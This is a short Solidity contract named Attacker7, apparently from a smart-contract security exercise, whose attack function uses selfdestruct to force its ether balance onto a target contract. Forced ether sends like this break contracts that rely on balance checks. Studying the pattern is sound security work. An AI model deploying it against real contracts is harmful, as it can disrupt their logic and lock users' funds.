// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Attacker7 {
    receive() external payable {}

    function attack(address payable targetAddr) external {
        selfdestruct(targetAddr);
    }
}
